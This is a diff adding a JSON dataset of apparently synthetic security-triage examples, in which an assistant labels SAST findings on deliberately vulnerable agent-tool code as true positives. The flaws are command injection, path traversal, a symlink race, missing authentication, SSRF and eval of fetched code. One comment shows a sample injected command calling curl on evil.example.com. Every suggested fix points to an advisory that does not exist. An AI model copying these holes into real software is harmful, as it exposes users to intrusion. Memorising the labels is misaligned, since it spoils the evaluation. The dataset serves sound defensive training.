\"status\": \"error\",\n                \"message\": f\"Command exited with code {result.returncode}: {result.stderr}\",\n            }                                                   # line 50\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-78 vulnerability. A task assistant agent receives user messages describing tasks. The tool dispatcher constructs shell commands by string-formatting user-supplied task descriptions directly into a command template and passes the result to subprocess.run with shell=True. An attacker can inject shell metacharacters in the task description to execute arbitrary commands.\nRealCWE: CWE-78\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-PY-SV-003",
+      "region_id": "R1",
+      "language": "python",
+      "claimed_cwe": "CWE-78",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "command_injection",
+      "real_world": false,
+      "project_id": "SB-PY-SV-003"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-78\nClaimed severity: MEDIUM\nFile: <SB-PY-SV-004>\nLines: see snippet\n\nCode:\ndef run_tests(context_snippets: list[str]) -> dict:             # line 22\n    \"\"\"Build and execute a test command from retrieved context snippets.\n\n    The ``context_snippets`` originate from the knowledge store, which\n    may contain entries written by untrusted parties. The snippets are\n    concatenated and interpolated directly into a shell command string.\n\n    Using ``shlex.quote()`` on each snippet — or using an explicit argv\n    list without shell=True — would prevent command injection here but\n    is missing.\n    \"\"\"\n    # Concatenate all retrieved context into a single instruction string.\n    # This string is then interpolated into the shell command template.\n    combined_context = \" && \".join(context_snippets)\n\n    # Build the shell command from the retrieved context.\n    # The context content is interpolated without any escaping, so\n    # shell metacharacters (;, |, $(), &&, etc.) embedded in the\n    # knowledge store entries will be interpreted by the shell.\n    cmd = f'cd {WORKSPACE_DIR} && echo \"Running tests per context...\" && {combined_context}'\n\n    if len(cmd) > MAX_COMMAND_LENGTH:\n        return {\n            \"status\": \"error\",\n            \"message\": f\"Constructed command exceeds {MAX_COMMAND_LENGTH} char limit\",\n        }\n\n    try:\n        result = subprocess.run(                                # line 50\n            cmd,\n            shell=True,\n            capture_output=True,\n            text=True,\n            timeout=TEST_TIMEOUT,\n            cwd=WORKSPACE_DIR,\n        )\n\n        return {                                                # line 59\n            \"status\": \"ok\" if result.returncode == 0 else \"error\",\n            \"message\": result.stdout.strip(),\n            \"stderr\": result.stderr.strip(),\n            \"returncode\": result.returncode,\n        }\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-78 vulnerability. A RAG-based coding assistant retrieves context snippets from a local JSON knowledge store and concatenates them into a prompt template that constructs a shell command for running tests. An attacker who previously wrote poisoned context to the store can inject shell metacharacters via the retrieved snippets, achieving command injection through the test runner tool.\nRealCWE: CWE-78\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-PY-SV-004",
+      "region_id": "R1",
+      "language": "python",
+      "claimed_cwe": "CWE-78",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "command_injection",
+      "real_world": false,
+      "project_id": "SB-PY-SV-004"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-22\nClaimed severity: MEDIUM\nFile: <SB-RS-SV-001>\nLines: see snippet\n\nCode:\npub fn write_file(\n    workspace_root: &str,\n    relative_path: &str,\n    content: &str,\n) -> WriteResult {\n    // Join the workspace root with the plan-step path. Path::join does\n    // NOT resolve `..` components — the resulting path can point outside\n    // the workspace.\n    let full_path = Path::new(workspace_root).join(relative_path);\n\n    // Create parent directories so nested module paths work.\n    if let Some(parent) = full_path.parent() {\n        if let Err(e) = fs::create_dir_all(parent) {\n            return WriteResult {\n                path: relative_path.to_string(),\n                status: \"error\".into(),\n                message: format!(\"Failed to create directories: {e}\"),\n            };\n        }\n    }\n\n    // Write the refactored content. This is the vulnerable sink — the\n    // path may resolve outside the workspace root.\n    match fs::write(&full_path, content) {\n        Ok(()) => WriteResult {\n            path: relative_path.to_string(),\n            status: \"ok\".into(),\n            message: String::new(),\n        },\n        Err(e) => WriteResult {\n            path: relative_path.to_string(),\n            status: \"error\".into(),\n            message: format!(\"Write failed: {e}\"),\n        },\n    }\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-22 vulnerability. A workspace refactor agent rewrites source files according to plan steps generated by an LLM planner. The file writer tool joins plan-step paths with the workspace root using Path::join but never canonicalizes or verifies that the resolved path stays within the workspace, allowing path traversal via ../ sequences to overwrite arbitrary files.\nRealCWE: CWE-22\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-RS-SV-001",
+      "region_id": "R1",
+      "language": "rust",
+      "claimed_cwe": "CWE-22",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "path_traversal",
+      "real_world": false,
+      "project_id": "SB-RS-SV-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-78\nClaimed severity: MEDIUM\nFile: <SB-RS-SV-002>\nLines: see snippet\n\nCode:\nfn run_shell_command(cmd: &str) -> TaskResult {\n    // The constructed command string is passed directly to sh -c without\n    // any sanitisation. If any interpolated value contains shell\n    // metacharacters (;, &&, ||, $(), backticks, etc.) they will be\n    // interpreted by the shell.\n    let output = Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(cmd)\n        .output();\n\n    match output {\n        Ok(out) => {\n            let stdout = String::from_utf8_lossy(&out.stdout).to_string();\n            let stderr = String::from_utf8_lossy(&out.stderr).to_string();\n            let combined = if stderr.is_empty() {\n                stdout\n            } else {\n                format!(\"{}\\n{}\", stdout, stderr)\n            };\n            TaskResult {\n                task_action: cmd.to_string(),\n                success: out.status.success(),\n                output: combined.trim().to_string(),\n            }\n        }\n        Err(e) => TaskResult {\n            task_action: cmd.to_string(),\n            success: false,\n            output: format!(\"Failed to spawn shell: {}\", e),\n        },\n    }\n}\n\n/// Build a cargo target.\n///\n/// The `task.target` and `task.features` values originate from the LLM\n/// planner and are interpolated into the shell command without validation.\npub fn run_build(task: &BuildTask, config: &AgentConfig) -> TaskResult {\n    let features = format_features(&task.features);\n    let cmd = format!(\n        \"cd {} && cargo build --bin {} {} 2>&1\",\n        config.project_root, task.target, features\n    );\n    println!(\"[build_runner] executing: {}\", cmd);\n    run_shell_command(&cmd)\n}\n\n/// Run tests with an optional filter.\n///\n/// The `task.test_filter` value originates from the LLM planner. Because it\n/// is interpolated directly into the shell command, a crafted filter string\n/// such as `\"tests && curl http://evil.example.com\"` would execute arbitrary\n/// commands.\npub fn run_tests(task: &BuildTask, config: &AgentConfig) -> TaskResult {\n    let features = format_features(&task.features);\n    let filter = task\n        .test_filter\n        .as_deref()\n        .unwrap_or(\"\");\n    let cmd = format!(\n        \"cd {} && cargo test {} {} -- {} 2>&1\",\n        config.project_root, task.target, features, filter\n    );\n    println!(\"[build_runner] executing: {}\", cmd);\n    run_shell_command(&cmd)\n}\n\n/// Run clippy lints on the project.\n///\n/// The `task.target` value is interpolated without validation.\npub fn run_lint(task: &BuildTask, config: &AgentConfig) -> TaskResult {\n    let cmd = format!(\n        \"cd {} && cargo clippy --bin {} -- -D warnings 2>&1\",\n        config.project_root, task.target\n    );\n    println!(\"[build_runner] executing: {}\", cmd);\n    run_shell_command(&cmd)\n}\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-78 vulnerability. A local CI/build helper agent constructs shell commands from unchecked task parameters produced by an LLM planner. Target names, feature flags, and test filters are string-interpolated into a command passed to sh -c without allowlist validation, enabling command injection.\nRealCWE: CWE-78\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-RS-SV-002",
+      "region_id": "R1",
+      "language": "rust",
+      "claimed_cwe": "CWE-78",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "command_injection",
+      "real_world": false,
+      "project_id": "SB-RS-SV-002"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-22\nClaimed severity: MEDIUM\nFile: <SB-RS-SV-003>\nLines: see snippet\n\nCode:\n    let abs_source = workspace_root.join(source);\n    let abs_dest = workspace_root.join(destination);\n\n    // Step 1: Validate source is inside the workspace.\n    let validated_source = path_guard::validate_path(workspace_root, &abs_source)\n        .map_err(|e| format!(\"source rejected: {e}\"))?;\n\n    // Step 2: Validate destination is inside the workspace.\n    let validated_dest = path_guard::validate_path(workspace_root, &abs_dest)\n        .map_err(|e| format!(\"destination rejected: {e}\"))?;\n\n    // Ensure the destination parent directory exists.\n    if let Some(parent) = validated_dest.parent() {\n        fs::create_dir_all(parent)\n            .map_err(|e| format!(\"failed to create directory: {e}\"))?;\n    }\n\n    // Step 3: Perform the copy using the previously validated paths.\n    //\n    // VULNERABLE: Between step 1 and this point, the symlink at\n    // `abs_source` can be swapped to point to /etc/shadow, ~/.ssh/id_rsa,\n    // or any other file.  `validated_source` still holds the old\n    // canonicalized path, but `fs::copy` follows the *current* filesystem\n    // state of `abs_source` — not the snapshot from step 1.\n    //\n    // On most platforms, fs::copy resolves the source path again internally,\n    // so swapping the symlink between validate_path and fs::copy causes the\n    // copy to read from the attacker-controlled target.\n    fs::copy(&abs_source, &validated_dest).map_err(|e| {\n        format!(\n            \"copy failed: {e} (from {} to {})\",\n            validated_source.display(),\n            validated_dest.display(),\n        )\n    })?;\n\n    Ok(format!(\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-22 vulnerability. A file sync agent copies files within a workspace according to tasks from an LLM planner. The path guard canonicalizes paths and checks workspace containment, but the validated path is used in a separate fs::copy call. Between validation and use, an attacker can swap a symlink at the source path to point outside the workspace, bypassing the guard via a TOCTOU race condition.\nRealCWE: CWE-22\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-RS-SV-003",
+      "region_id": "R1",
+      "language": "rust",
+      "claimed_cwe": "CWE-22",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "path_traversal",
+      "real_world": false,
+      "project_id": "SB-RS-SV-003"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-other:auth_bypass\nClaimed severity: MEDIUM\nFile: <SB-RS-SV-004>\nLines: see snippet\n\nCode:\npub fn start_server(config: &Config) -> Result<(), String> { // line 25\n    let listener = TcpListener::bind(&config.bind_address)\n        .map_err(|e| format!(\"Failed to bind: {e}\"))?;\n\n    println!(\"[handler] Listening on {}\", config.bind_address);\n\n    for stream in listener.incoming() {\n        match stream {\n            Ok(mut stream) => {\n                // No authentication check. Any client that connects\n                // can send commands. There is no token verification,\n                // no mTLS, no peer certificate check, no IP allowlist.\n                //\n                // A secure implementation would:\n                // 1. Require a valid X-Agent-Token header\n                // 2. Verify the token against a shared secret or HMAC\n                // 3. Check the peer certificate via mTLS\n                // 4. Enforce an IP allowlist for known peer agents\n                //\n                // None of these checks are performed here.\n\n                let body = match read_http_body(&mut stream) {\n                    Ok(b) => b,\n                    Err(e) => {\n                        let _ = write_response(&mut stream, 400, &format!(\"Bad request: {e}\"));\n                        continue;\n                    }\n                };\n\n                let task = match parse_task_command(&body) {\n                    Ok(t) => t,\n                    Err(e) => {\n                        let _ = write_response(&mut stream, 400, &format!(\"Invalid payload: {e}\"));\n                        continue;\n                    }\n                };\n\n                let result = dispatch_command(&task);\n\n                let status_code = if result.status == \"ok\" { 200 } else { 500 };\n                let _ = write_response(\n                    &mut stream,\n                    status_code,\n                    &format!(\"{{\\\"status\\\":\\\"{}\\\",\\\"message\\\":\\\"{}\\\"}}\", result.status, result.message),\n                );                                              // line 69\n            }\n            Err(e) => {\n                eprintln!(\"[handler] Accept error: {e}\");\n            }\n        }\n    }\n\n    Ok(())\n}\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-other:auth_bypass vulnerability. A multi-agent orchestration system has a coordinator agent that listens on an HTTP endpoint for task commands from peer agents. The handler parses incoming JSON payloads and dispatches commands to internal tools (file operations, shell execution). There is no authentication — any network client can send commands as if they were a trusted peer agent, bypassing all access controls.\nRealCWE: CWE-other:auth_bypass\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-RS-SV-004",
+      "region_id": "R1",
+      "language": "rust",
+      "claimed_cwe": "CWE-other:auth_bypass",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "auth_bypass",
+      "real_world": false,
+      "project_id": "SB-RS-SV-004"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-78\nClaimed severity: MEDIUM\nFile: <SB-TS-SV-001>\nLines: see snippet\n\nCode:\nexport function runCommand(command: string): Promise<CommandResult> {   // line 21\n  /**\n   * Execute a shell command and return its output.\n   *\n   * `command` originates from the agent planner, whose output is\n   * controlled by the language model. There is no validation that\n   * the command matches a known-safe set (e.g. the KNOWN_COMMANDS\n   * allowlist defined in config/settings.ts).\n   *\n   * Enforcing an allowlist — or at minimum using execFile() with an\n   * explicit argv array instead of exec() — would prevent arbitrary\n   * command execution here but is missing.\n   */\n  return new Promise((resolve) => {\n    exec(                                                              // line 35\n      command,\n      {\n        cwd: WORKSPACE_ROOT,\n        timeout: EXEC_TIMEOUT_MS,\n        shell: \"/bin/sh\",\n      },\n      (error, stdout, stderr) => {\n        resolve({\n          status: error ? \"error\" : \"ok\",\n          command,\n          stdout: stdout.toString(),\n          stderr: stderr.toString(),\n          exitCode: error?.code ?? 0,\n        });\n      },\n    );                                                                 // line 48\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-78 vulnerability. A web-IDE coding agent uses an LLM planner to produce shell commands (test, lint, build). The tool runner forwards these model-generated shell fragments directly to child_process.exec() without enforcing a command allowlist, enabling arbitrary command execution on the host.\nRealCWE: CWE-78\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-TS-SV-001",
+      "region_id": "R1",
+      "language": "typescript",
+      "claimed_cwe": "CWE-78",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "command_injection",
+      "real_world": false,
+      "project_id": "SB-TS-SV-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-918\nClaimed severity: MEDIUM\nFile: <SB-TS-SV-002>\nLines: see snippet\n\nCode:\nexport async function fetchUrl(url: string): Promise<FetchResult> {   // line 15\n  /**\n   * Fetch a URL and return page metadata.\n   *\n   * This function receives URLs directly from the agent planner, which\n   * are ultimately sourced from model output. There is no validation on\n   * the target host or URL scheme before the request is made.\n   *\n   * A host allowlist (e.g., restricting to api.booking.com,\n   * api.skyscanner.net, api.openweathermap.org) would prevent SSRF\n   * here but is missing.\n   */\n  try {\n    const response = await fetch(url, {                               // line 28\n      method: \"GET\",\n      headers: {\n        \"User-Agent\": USER_AGENT,\n      },\n      signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),\n    });\n\n    if (!response.ok) {\n      throw new Error(`HTTP ${response.status} ${response.statusText}`);\n    }\n\n    const body = await response.text();\n    const title = extractTitle(body);\n    return {\n      url,\n      status: \"ok\",\n      title,\n    };                                                                // line 43\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-918 vulnerability. A travel planning agent fetches hotel listings, airline prices, and destination info from URLs suggested by an LLM planner. The URL fetcher tool passes model-suggested URLs directly to an HTTP client without enforcing a host allowlist, allowing SSRF to internal services such as the cloud metadata endpoint.\nRealCWE: CWE-918\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-TS-SV-002",
+      "region_id": "R1",
+      "language": "typescript",
+      "claimed_cwe": "CWE-918",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "ssrf",
+      "real_world": false,
+      "project_id": "SB-TS-SV-002"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-78\nClaimed severity: MEDIUM\nFile: <SB-TS-SV-003>\nLines: see snippet\n\nCode:\nasync function loadPlugin(                                      // line 25\n  entry: PluginManifestEntry,\n): Promise<LoadedPlugin> {\n  /**\n   * The code URL comes from the remote registry manifest. There is no\n   * verification that the URL points to a trusted source, and no\n   * integrity check (hash or signature) is performed on the downloaded\n   * code before it is evaluated.\n   *\n   * Verifying a cryptographic hash of the downloaded code against a\n   * signed manifest — or restricting code URLs to an allowlist of\n   * trusted hosts — would prevent arbitrary code execution here but\n   * is missing.\n   */\n  const controller = new AbortController();\n  const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);\n\n  try {\n    const response = await fetch(entry.codeUrl, {               // line 43\n      signal: controller.signal,\n    });\n\n    if (!response.ok) {\n      return {\n        name: entry.name,\n        version: entry.version,\n        status: \"error\",\n        message: `HTTP ${response.status} fetching plugin code`,\n      };\n    }\n\n    const code = await response.text();\n\n    if (code.length > MAX_PLUGIN_SIZE_BYTES) {\n      return {\n        name: entry.name,\n        version: entry.version,\n        status: \"error\",\n        message: `Plugin code exceeds size limit (${code.length} bytes)`,\n      };\n    }\n\n    // Execute the fetched code without integrity verification.\n    eval(code);                                                 // line 68\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-78 vulnerability. A plugin-extensible agent loads extensions from a configurable registry URL. The plugin loader fetches a manifest JSON from the registry, extracts a code URL, downloads the code, and evals it without any integrity check (no hash verification, no signature, no allowlist of sources), enabling arbitrary code execution from a compromised or malicious registry.\nRealCWE: CWE-78\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-TS-SV-003",
+      "region_id": "R1",
+      "language": "typescript",
+      "claimed_cwe": "CWE-78",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "command_injection",
+      "real_world": false,
+      "project_id": "SB-TS-SV-003"
+    }
+  }
+]
